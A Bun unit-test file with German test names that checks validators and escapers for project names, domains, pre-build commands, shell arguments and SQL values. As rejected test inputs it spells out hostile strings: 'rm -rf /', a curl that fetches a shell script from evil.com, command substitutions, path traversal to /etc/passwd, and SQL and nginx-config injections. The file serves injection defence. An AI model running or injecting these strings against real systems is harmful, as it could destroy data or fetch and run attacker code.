import { describe, test, expect } from 'bun:test'
import {
  validateProjectName,
  validateDomain,
  validatePreBuildCmd,
  escapeShellArg,
  escapeSqlValue,
  sanitizeSqlIdentifier,
} from '../validate.js'

// --- validateProjectName ---

describe('validateProjectName', () => {
  test('akzeptiert gueltige Namen', () => {
    expect(validateProjectName('my-project').valid).toBe(true)
    expect(validateProjectName('test123').valid).toBe(true)
    expect(validateProjectName('my.site').valid).toBe(true)
    expect(validateProjectName('my_app').valid).toBe(true)
    expect(validateProjectName('a').valid).toBe(true)
  })

  test('lehnt leere/ungueltige Eingaben ab', () => {
    expect(validateProjectName('').valid).toBe(false)
    expect(validateProjectName(null).valid).toBe(false)
    expect(validateProjectName(undefined).valid).toBe(false)
  })

  test('lehnt Namen ab die mit Sonderzeichen beginnen', () => {
    expect(validateProjectName('.hidden').valid).toBe(false)
    expect(validateProjectName('-dash').valid).toBe(false)
    expect(validateProjectName('_under').valid).toBe(false)
  })

  test('lehnt zu lange Namen ab', () => {
    expect(validateProjectName('a'.repeat(65)).valid).toBe(false)
    expect(validateProjectName('a'.repeat(64)).valid).toBe(true)
  })

  test('lehnt Shell-Injection ab', () => {
    expect(validateProjectName('test; rm -rf /').valid).toBe(false)
    expect(validateProjectName('test && echo pwned').valid).toBe(false)
    expect(validateProjectName('test`id`').valid).toBe(false)
    expect(validateProjectName('test$(whoami)').valid).toBe(false)
  })

  test('lehnt Path-Traversal ab', () => {
    expect(validateProjectName('../etc/passwd').valid).toBe(false)
    expect(validateProjectName('test/../../root').valid).toBe(false)
  })
})

// --- validateDomain ---

describe('validateDomain', () => {
  test('akzeptiert gueltige Domains', () => {
    expect(validateDomain('example.de').valid).toBe(true)
    expect(validateDomain('sub.example.com').valid).toBe(true)
    expect(validateDomain('my-site.example.co.uk').valid).toBe(true)
    expect(validateDomain('test123.rhdemo.de').valid).toBe(true)
  })

  test('lehnt leere/ungueltige Eingaben ab', () => {
    expect(validateDomain('').valid).toBe(false)
    expect(validateDomain(null).valid).toBe(false)
    expect(validateDomain('localhost').valid).toBe(false)
    expect(validateDomain('just-a-word').valid).toBe(false)
  })

  test('lehnt Shell-Injection in Domains ab', () => {
    expect(validateDomain('example.com; rm -rf /').valid).toBe(false)
    expect(validateDomain('example.com && echo pwned').valid).toBe(false)
    expect(validateDomain('example.com`id`').valid).toBe(false)
    expect(validateDomain('example.com\nproxy_pass evil').valid).toBe(false)
  })

  test('lehnt zu lange Domains ab', () => {
    expect(validateDomain('a'.repeat(250) + '.com').valid).toBe(false)
  })

  test('lehnt IP-Adressen ab', () => {
    expect(validateDomain('192.168.1.1').valid).toBe(false)
  })
})

// --- validatePreBuildCmd ---

describe('validatePreBuildCmd', () => {
  test('akzeptiert leere Befehle', () => {
    expect(validatePreBuildCmd('').valid).toBe(true)
    expect(validatePreBuildCmd(null).valid).toBe(true)
    expect(validatePreBuildCmd(undefined).valid).toBe(true)
  })

  test('akzeptiert erlaubte Befehle', () => {
    expect(validatePreBuildCmd('prisma generate').valid).toBe(true)
    expect(validatePreBuildCmd('bun run build').valid).toBe(true)
    expect(validatePreBuildCmd('bunx prisma migrate deploy').valid).toBe(true)
    expect(validatePreBuildCmd('npm run postinstall').valid).toBe(true)
    expect(validatePreBuildCmd('node scripts/setup.js').valid).toBe(true)
    expect(validatePreBuildCmd('php artisan migrate').valid).toBe(true)
    expect(validatePreBuildCmd('composer dump-autoload').valid).toBe(true)
  })

  test('lehnt nicht-erlaubte Befehle ab', () => {
    expect(validatePreBuildCmd('rm -rf /').valid).toBe(false)
    expect(validatePreBuildCmd('curl http://evil.com/shell.sh').valid).toBe(false)
    expect(validatePreBuildCmd('sudo anything').valid).toBe(false)
    expect(validatePreBuildCmd('wget malware').valid).toBe(false)
  })

  test('lehnt Shell-Operatoren ab', () => {
    expect(validatePreBuildCmd('prisma generate; rm -rf /').valid).toBe(false)
    expect(validatePreBuildCmd('bun run build && curl evil').valid).toBe(false)
    expect(validatePreBuildCmd('npm run build | tee log').valid).toBe(false)
    expect(validatePreBuildCmd('bun run build `id`').valid).toBe(false)
    expect(validatePreBuildCmd('prisma generate $(whoami)').valid).toBe(false)
  })
})

// --- escapeShellArg ---

describe('escapeShellArg', () => {
  test('escaped leere Werte', () => {
    expect(escapeShellArg('')).toBe("''")
    expect(escapeShellArg(null)).toBe("''")
    expect(escapeShellArg(undefined)).toBe("''")
  })

  test('escaped normale Strings', () => {
    expect(escapeShellArg('hello')).toBe("'hello'")
    expect(escapeShellArg('my-project')).toBe("'my-project'")
  })

  test('escaped Single-Quotes', () => {
    expect(escapeShellArg("it's")).toBe("'it'\\''s'")
    expect(escapeShellArg("test'quote")).toBe("'test'\\''quote'")
  })

  test('escaped gefaehrliche Zeichen', () => {
    expect(escapeShellArg('test; rm -rf /')).toBe("'test; rm -rf /'")
    expect(escapeShellArg('$HOME')).toBe("'$HOME'")
    expect(escapeShellArg('`id`')).toBe("'`id`'")
    expect(escapeShellArg('$(whoami)')).toBe("'$(whoami)'")
  })

  test('escaped Leerzeichen und Sonderzeichen', () => {
    expect(escapeShellArg('hello world')).toBe("'hello world'")
    expect(escapeShellArg('path/to/file')).toBe("'path/to/file'")
  })
})

// --- escapeSqlValue ---

describe('escapeSqlValue', () => {
  test('escaped leere Werte', () => {
    expect(escapeSqlValue('')).toBe("''")
    expect(escapeSqlValue(null)).toBe("''")
  })

  test('escaped normale Strings', () => {
    expect(escapeSqlValue('password123')).toBe("'password123'")
  })

  test('escaped Single-Quotes', () => {
    expect(escapeSqlValue("it's")).toBe("'it\\'s'")
  })

  test('escaped Backslashes', () => {
    expect(escapeSqlValue('path\\to')).toBe("'path\\\\to'")
  })

  test('escaped Backticks', () => {
    expect(escapeSqlValue('test`injection')).toBe("'test\\`injection'")
  })

  test('escaped Null-Bytes', () => {
    expect(escapeSqlValue('test\0evil')).toBe("'test\\0evil'")
  })
})

// --- sanitizeSqlIdentifier ---

describe('sanitizeSqlIdentifier', () => {
  test('behaelt gueltige Zeichen', () => {
    expect(sanitizeSqlIdentifier('db_test_abc123')).toBe('db_test_abc123')
  })

  test('entfernt ungueltige Zeichen', () => {
    expect(sanitizeSqlIdentifier('db-test')).toBe('dbtest')
    expect(sanitizeSqlIdentifier('db.test')).toBe('dbtest')
    expect(sanitizeSqlIdentifier("test'; DROP TABLE--")).toBe('testDROPTABLE')
  })
})
